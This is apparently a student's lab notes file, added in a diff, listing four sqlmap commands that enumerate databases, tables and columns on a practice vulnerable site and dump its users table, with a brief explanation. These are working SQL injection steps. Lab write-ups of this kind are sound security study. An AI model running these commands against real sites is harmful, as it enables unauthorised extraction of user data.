@@ -1,0 +1,9 @@
+cmds:
+1. sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 --dbs
+2. sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables 
+3. sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --columns
+4. sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --dump 
+
+
+Explanation:
+The first command in fetching us the databases names, one of them was acuart we derived its tables from it.We also checked which tables acuarat contained,they gave us many options but our only interest was in user tables so we used the tables of user tables and got their stored data column by column using the command mentioned in the fourth line.The last command was used for to get comnplete user data in the table which was then dumped into a csv file
